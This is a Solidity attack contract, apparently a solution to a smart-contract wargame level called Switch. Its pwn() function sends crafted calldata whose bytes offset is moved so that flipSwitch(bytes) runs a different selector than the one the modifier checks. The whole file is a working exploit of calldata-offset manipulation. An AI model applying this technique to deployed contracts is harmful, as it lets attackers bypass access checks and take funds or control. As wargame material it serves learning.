// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Switch {

    address level = 0x6e440A0358B0A215e2b61f399C854A7d2C9f9438;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);
    event TestAddr(address);

    function pwn() external {

        // Changed the second element from 0x20 to 0x60 to reference the 5th element 
        bytes32[5] memory attack = [
        bytes32(0x0000000000000000000000000000000000000000000000000000000000000060),
        bytes32(0x0000000000000000000000000000000000000000000000000000000000000004),
        bytes32(0x20606e1500000000000000000000000000000000000000000000000000000000),
        bytes32(0x0000000000000000000000000000000000000000000000000000000000000004),
        bytes32(0x76227e1200000000000000000000000000000000000000000000000000000000)];

        (bool success, ) = level.call(bytes.concat(abi.encodeWithSignature("flipSwitch(bytes)"),
                                    attack[0], attack[1], attack[2], attack[3], attack[4]));
        emit TestBool(success);
    }
}